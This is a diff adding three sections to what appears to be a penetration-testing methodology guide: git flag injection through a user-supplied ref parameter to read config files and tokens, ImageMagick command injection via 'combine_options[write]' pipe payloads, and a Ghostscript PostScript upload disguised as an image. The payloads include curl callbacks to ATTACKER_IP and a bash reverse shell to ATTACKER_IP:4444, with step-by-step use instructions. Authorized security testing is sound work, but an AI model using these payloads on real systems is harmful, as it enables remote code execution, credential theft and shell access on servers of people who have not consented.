@@ -430,6 +430,91 @@ GET /api/ping-server.php/system/id
 GET /api/ping-server.php/system/ls
 ```
 
+### 7.10 Git flag injection via user-controlled `ref` parameter
+
+When a search or blob API passes a user-supplied `ref` parameter directly to `git grep` without sanitization, setting `ref=--no-index` causes git to search the working directory (including files not tracked by git) rather than a specific commit. This can expose internal config files:
+
+```
+# Vulnerable API call pattern
+GET /api/v4/projects/ID/search?scope=blobs&search=.&ref=--no-index
+
+# git receives:
+git --git-dir /path/to/repo.git grep ... -e . --no-index
+# → searches current working directory including config.toml, env files
+```
+
+**What it exposes:** Internal config files adjacent to git repos — API tokens, Gitaly tokens, Sentry DSNs, database credentials in `config.toml` or similar.
+
+**Broadly applicable:** Any API that runs `git grep $ref` or `git show $ref:path` where `$ref` is user-supplied. Test with `--no-index` (read working dir), `-C /` (change working dir to root), `--open-files-in-pager` (trigger pager execution).
+
+### 7.11 ImageMagick command injection via image processing parameters
+
+When a web app's image resize/transform endpoint passes user-controlled parameters to ImageMagick (directly or via an image processing library), ImageMagick's `-write` argument accepts a pipe syntax that executes an arbitrary OS command. If user-supplied transformation options reach ImageMagick without sanitization, this achieves RCE.
+
+**Detection:** Look for endpoints that accept image transformation parameters — `resize`, `crop`, `quality`, `format`, `combine_options`, or similar — especially in apps using Rails Active Storage/MiniMagick, PHP Imagick, or any ImageMagick wrapper.
+
+**Payloads:**
+```bash
+# Via combine_options (Rails/MiniMagick pattern)
+# Append to image variant URL or POST body
+?combine_options[write]=| id > /tmp/pwned
+?combine_options[write]=| curl http://ATTACKER_IP/$(id)
+
+# Via direct write argument injection
+?operations[][name]=write&operations[][value]=|id > /tmp/pwned
+
+# Test for write handler execution (blind — check OOB)
+?combine_options[write]=| curl http://ATTACKER_EZXSS_DOMAIN/imgmagick
+```
+
+**Confirm execution:**
+```bash
+# If app reflects image output, use ImageMagick to write data into the image metadata
+?combine_options[comment]=INJECTED_MARKER
+
+# Blind — check /tmp for file creation (if you have LFI or error disclosure)
+?combine_options[write]=/tmp/pwned.txt
+
+# OOB DNS via curl
+?combine_options[write]=| curl http://YOUR_EZXSS_DOMAIN/imgcmd
+```
+
+**Broadly applicable to:** Any app using ImageMagick for image processing that forwards user-supplied transformation keys/values to the library. Not limited to Rails — also applies to PHP Imagick with `setOption()`, Python Wand, and any framework that builds an ImageMagick command string from request parameters.
+
+### 7.12 PostScript/Ghostscript RCE via disguised image upload
+
+When an app uses ImageMagick for server-side image processing and does not validate actual file content (only the extension), uploading a PostScript or EPS file disguised as an image (`.gif`, `.jpeg`, `.png`) causes ImageMagick to detect the `%!PS` magic bytes and delegate processing to the Ghostscript interpreter. Ghostscript executes arbitrary PostScript commands, enabling RCE.
+
+**Detection:** Any image upload endpoint using ImageMagick without content-type validation. Look for apps that process uploaded avatars, profile images, cover photos, or design assets.
+
+**Payload (upload as `exploit.gif` or `exploit.jpeg`):**
+```
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%curl http://YOUR_EZXSS_DOMAIN/ghostscript-rce) currentdevice putdeviceprops
+```
+
+**With reverse shell:**
+```
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1) currentdevice putdeviceprops
+```
+
+**Steps:**
+1. Create a file starting with `%!PS` (PostScript magic bytes)
+2. Save with a valid image extension (`.gif` is most reliable — ImageMagick historically trusted extension for GIF but reads magic bytes)
+3. Upload to any image processing endpoint
+4. If the server processes it, the Ghostscript interpreter executes the `%pipe%` command
+
+**Broadly applicable to:** Any server using ImageMagick/GraphicsMagick without restricting Ghostscript delegation. Not version-specific — Ghostscript has had multiple exploitable vulnerabilities in this delegation path (CVE-2017-8291, ImageTragick family).
+
 ---
 
 ## 8. False-positive checks
